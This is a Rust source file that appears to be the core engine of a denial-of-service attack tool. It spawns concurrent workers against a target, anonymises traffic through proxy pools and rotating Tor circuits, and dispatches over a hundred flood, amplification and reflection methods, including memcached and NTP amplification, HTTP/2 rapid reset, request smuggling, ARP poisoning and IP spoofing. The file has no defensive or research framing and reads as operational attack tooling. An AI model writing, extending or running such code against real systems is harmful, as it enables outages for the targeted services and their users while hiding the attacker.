use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::time::{Duration, Instant};
use tokio::task::JoinHandle;
use tokio::sync::Semaphore;
use crate::config::AttackConfig;
use crate::logger;
use crate::proxy::ProxyPool;
use crate::tor::TorController;
use crate::protocols::tcp::TcpAttacker;
use crate::protocols::udp::UdpAttacker;
use crate::protocols::http::HttpAttacker;
use crate::protocols::other::OtherAttacker;

#[derive(Clone)]
pub struct WorkerCtx {
    pub target:        String,
    pub port:          u16,
    pub use_ssl:       bool,
    pub running:       Arc<AtomicBool>,
    pub sent:          Arc<AtomicU64>,
    pub errors:        Arc<AtomicU64>,
    pub bytes_sent:    Arc<AtomicU64>,
    pub connect_sem:   Arc<Semaphore>,
    pub proxy_pool:    Option<Arc<ProxyPool>>,
    pub tor_socks:     Option<String>,
    pub connect_ms:    u64,
    pub read_ms:       u64,
    pub write_ms:      u64,
}

impl WorkerCtx {
    pub fn ok(&self)  { self.sent.fetch_add(1, Ordering::Relaxed); }
    pub fn err(&self) { self.errors.fetch_add(1, Ordering::Relaxed); }
    pub fn alive(&self) -> bool { self.running.load(Ordering::Relaxed) }
    pub fn add_bytes(&self, n: u64) { self.bytes_sent.fetch_add(n, Ordering::Relaxed); }
}

pub struct AttackEngine {
    pub config: AttackConfig,
    sent:       Arc<AtomicU64>,
    errors:     Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    running:    Arc<AtomicBool>,
}

impl AttackEngine {
    pub fn new(config: AttackConfig) -> Self {
        Self {
            config,
            sent:       Arc::new(AtomicU64::new(0)),
            errors:     Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            running:    Arc::new(AtomicBool::new(false)),
        }
    }

    pub async fn launch(&self) {
        self.sent.store(0, Ordering::Relaxed);
        self.errors.store(0, Ordering::Relaxed);
        self.bytes_sent.store(0, Ordering::Relaxed);
        self.running.store(true, Ordering::Relaxed);

        let start = Instant::now();

        
        let proxy_pool: Option<Arc<ProxyPool>> = if self.config.proxy.enabled && !self.config.proxy.proxies.is_empty() {
            let pool = Arc::new(ProxyPool::from_settings(&self.config.proxy));
            if self.config.proxy.health_check {
                pool.health_check(
                    self.config.limits.connect_timeout_ms,
                    (self.config.workers / 4).max(4)
                ).await;
                if pool.alive_count() == 0 {
                    logger::log_warn("No alive proxies — continuing without proxy");
                    None
                } else {
                    pool.print_stats();
                    Some(pool)
                }
            } else {
                Some(pool)
            }
        } else {
            None
        };

        
        let tor_socks: Option<String> = if self.config.tor.enabled {
            let mut ctrl = TorController::new(self.config.tor.clone());
            if ctrl.start().await {
                let socks = ctrl.socks5_addr();

                
                let ctrl_arc = Arc::new(tokio::sync::Mutex::new(ctrl));
                let running = self.running.clone();
                tokio::spawn(TorController::start_rotation_loop(ctrl_arc, running));

                Some(socks)
            } else {
                logger::log_warn("Tor failed to start — continuing without Tor");
                None
            }
        } else {
            None
        };

        
        let max_conn = self.config.limits.max_connections;
        let sem = Arc::new(Semaphore::new(max_conn));

        let effective_workers = self.config.effective_workers();
        logger::log_attack(&format!(
            "Launching: {} | Effective workers: {} (capped from {})",
            self.config.summary(), effective_workers, self.config.workers
        ));

        
        let mut handles: Vec<JoinHandle<()>> = vec![];

        for _ in 0..effective_workers {
            for method in &self.config.methods {
                let ctx = WorkerCtx {
                    target:      self.config.target.clone(),
                    port:        self.config.port,
                    use_ssl:     self.config.use_ssl,
                    running:     self.running.clone(),
                    sent:        self.sent.clone(),
                    errors:      self.errors.clone(),
                    bytes_sent:  self.bytes_sent.clone(),
                    connect_sem: sem.clone(),
                    proxy_pool:  proxy_pool.clone(),
                    tor_socks:   tor_socks.clone(),
                    connect_ms:  self.config.limits.connect_timeout_ms,
                    read_ms:     self.config.limits.read_timeout_ms,
                    write_ms:    self.config.limits.write_timeout_ms,
                };
                handles.push(Self::spawn_worker(ctx, method.clone()));
            }
        }

        
        let running  = self.running.clone();
        let sent     = self.sent.clone();
        let errors   = self.errors.clone();
        let bytes    = self.bytes_sent.clone();
        let duration = self.config.duration_secs;

        let stat_handle = tokio::spawn(async move {
            let mut elapsed = 0u64;
            let mut prev_sent = 0u64;

            while elapsed < duration {
                tokio::time::sleep(Duration::from_secs(1)).await;
                elapsed += 1;

                let cur_sent = sent.load(Ordering::Relaxed);
                let cur_err  = errors.load(Ordering::Relaxed);
                let cur_bytes = bytes.load(Ordering::Relaxed);
                let pps      = cur_sent - prev_sent;
                let mbps     = (cur_bytes as f64) / 1_048_576.0 / elapsed as f64;
                prev_sent    = cur_sent;

                logger::log_stat(&format!(
                    "T+{:>4}s | Sent: {:>10} | Errors: {:>7} | PPS: {:>7} | Avg: {:.2} MB/s",
                    elapsed, cur_sent, cur_err, pps, mbps
                ));
            }

            running.store(false, Ordering::Relaxed);
        });

        stat_handle.await.unwrap_or(());

        
        tokio::time::sleep(Duration::from_secs(2)).await;
        for h in handles { h.abort(); }

        
        let total  = self.sent.load(Ordering::Relaxed);
        let errs   = self.errors.load(Ordering::Relaxed);
        let bsent  = self.bytes_sent.load(Ordering::Relaxed);
        let secs   = start.elapsed().as_secs().max(1);

        logger::log_success(&format!(
            "Attack complete — Sent: {} pkts | Errors: {} | Avg PPS: {} | Data: {:.2} MB | Duration: {}s",
            total, errs, total / secs,
            bsent as f64 / 1_048_576.0,
            secs
        ));
    }

    fn spawn_worker(ctx: WorkerCtx, method: String) -> JoinHandle<()> {
        tokio::spawn(async move {
            let m = method.to_lowercase();

            macro_rules! tcp   { ($f:ident) => {{ TcpAttacker::from_ctx(&ctx).$f().await }} }
            macro_rules! udp   { ($f:ident) => {{ UdpAttacker::from_ctx(&ctx).$f().await }} }
            macro_rules! http  { ($f:ident) => {{ HttpAttacker::from_ctx(&ctx).$f().await }} }
            macro_rules! other { ($f:ident) => {{ OtherAttacker::from_ctx(&ctx).$f().await }} }

            match m.as_str() {
                
                "syn"            => tcp!(syn_flood),
                "ack"            => tcp!(ack_flood),
                "rst"            => tcp!(rst_flood),
                "fin"            => tcp!(fin_flood),
                "syn_ack"        => tcp!(syn_ack_flood),
                "push"           => tcp!(push_flood),
                "null"           => tcp!(null_flood),
                "xmas"           => tcp!(xmas_flood),
                "connection"     => tcp!(connection_flood),
                "frag"           => tcp!(fragmentation_flood),
                "zero_window"    => tcp!(zero_window_flood),
                "window_scale"   => tcp!(window_scale_flood),
                "ttl"            => tcp!(ttl_flood),
                "src_port"       => tcp!(src_port_flood),
                "half_open"      => tcp!(half_open_rst),
                "urgent"         => tcp!(urgent_flood),
                "mss"            => tcp!(mss_flood),
                "sockstress"     => tcp!(sockstress),
                "persist"        => tcp!(persist_timer_flood),
                "mixed_flags"    => tcp!(mixed_flags_flood),
                
                "udp"            => udp!(udp_flood),
                "udp_var"        => udp!(udp_variable_flood),
                "dns"            => udp!(dns_flood),
                "dns_any"        => udp!(dns_any_flood),
                "dns_amp"        => udp!(dns_amp_edns),
                "dns_nxdomain"   => udp!(dns_nxdomain_flood),
                "ntp"            => udp!(ntp_amplification),
                "ssdp"           => udp!(ssdp_amplification),
                "cldap"          => udp!(cldap_amplification),
                "memcached"      => udp!(memcached_amplification),
                "snmp"           => udp!(snmp_amplification),
                "chargen"        => udp!(chargen_amplification),
                "voip"           => udp!(voip_flood),
                "quic_amp"       => udp!(quic_amplification),
                "coap"           => udp!(coap_amplification),
                "tftp"           => udp!(tftp_amplification),
                "wsd"            => udp!(wsd_amplification),
                "plex"           => udp!(plex_amplification),
                "steam"          => udp!(steam_amplification),
                "openvpn"        => udp!(openvpn_amplification),
                "udp_spoof"      => udp!(spoof_udp_flood),
                
                "get"            => http!(get_flood),
                "post"           => http!(post_flood),
                "head"           => http!(head_flood),
                "put"            => http!(put_flood),
                "delete"         => http!(delete_flood),
                "options"        => http!(options_flood),
                "patch"          => http!(patch_flood),
                "slowloris"      => http!(slowloris),
                "slow_post"      => http!(slow_post),
                "slow_headers"   => http!(slow_headers),
                "h2reset"        => http!(http2_rapid_reset),
                "h2flood"        => http!(http2_flood),
                "cache"          => http!(cache_bypass),
                "websocket"      => http!(websocket_flood),
                "chunked"        => http!(chunked_bypass),
                "multipart"      => http!(multipart_bypass),
                "smuggle_cl_te"  => http!(smuggle_cl_te),
                "smuggle_te_cl"  => http!(smuggle_te_cl),
                "xff"            => http!(xff_bypass_flood),
                "bot"            => http!(bot_bypass_flood),
                "tls_hello"      => http!(tls_handshake_flood),
                "tls_session"    => http!(tls_session_flood),
                "graphql"        => http!(graphql_flood),
                "api_key"        => http!(api_key_bypass),
                "range"          => http!(range_bypass_flood),
                "connect"        => http!(connect_flood),
                "trace"          => http!(trace_flood),
                
                "icmp"           => other!(icmp_flood),
                "smurf"          => other!(icmp_smurf),
                "fraggle"        => other!(icmp_fraggle),
                "pod"            => other!(icmp_ping_of_death),
                "icmpv6"         => other!(icmpv6_flood),
                "icmpv6_ns"      => other!(icmpv6_neighbor_solicit),
                "icmpv6_ra"      => other!(icmpv6_router_advert),
                
                "dns_query"      => other!(dns_query_flood),
                "dns_txt"        => other!(dns_txt_flood),
                "dns_mx"         => other!(dns_mx_flood),
                "dns_subdomain"  => other!(dns_subdomain_flood),
                
                "ntp_ref"        => other!(ntp_reflection),
                "ntp_monlist"    => other!(ntp_monlist),
                "ntp_time"       => other!(ntp_time_flood),
                
                "gre"            => other!(gre_flood),
                "gre_keepalive"  => other!(gre_keepalive_flood),
                "gre_key"        => other!(gre_key_flood),
                
                "ssdp_all"       => other!(ssdp_all_devices),
                "ssdp_igd"       => other!(ssdp_igd_flood),
                
                "snmp_v3"        => other!(snmp_v3_flood),
                "snmp_bulk"      => other!(snmp_bulk_walk),
                
                "ldap"           => other!(ldap_reflection),
                "cldap_ref"      => other!(cldap_reflection),
                "cldap_netlogon" => other!(cldap_netlogon_flood),
                
                "sip"            => other!(sip_invite_flood),
                "sip_register"   => other!(sip_register_flood),
                "sip_options"    => other!(sip_options_flood),
                "sip_cancel"     => other!(sip_cancel_storm),
                
                "rtp"            => other!(rtp_flood),
                "rtp_dtmf"       => other!(rtp_dtmf_flood),
                "rtcp"           => other!(rtcp_flood),
                "rtp_jitter"     => other!(rtp_jitter_flood),
                
                "quic"           => other!(quic_initial_flood),
                "quic_vneg"      => other!(quic_version_negotiation),
                "quic_path"      => other!(quic_path_challenge),
                "quic_stream"    => other!(quic_stream_flood),
                
                "dhcp"           => other!(dhcp_starvation),
                "dhcp_release"   => other!(dhcp_release_flood),
                "dhcp_decline"   => other!(dhcp_decline_flood),
                
                "ip_frag"        => other!(ip_fragmentation),
                "ip_land"        => other!(ip_land_attack),
                "ip_teardrop"    => other!(ip_teardrop),
                "ip_spoof"       => other!(ip_spoof_flood),
                
                "arp"            => other!(arp_flood),
                "arp_poison"     => other!(arp_poison),
                "arp_gratuitous" => other!(arp_gratuitous_flood),
                
                "rdp_amp"        => other!(rdp_amplification),

                _ => { logger::log_warn(&format!("Unknown method: {}", m)); }
            }
        })
    }
}
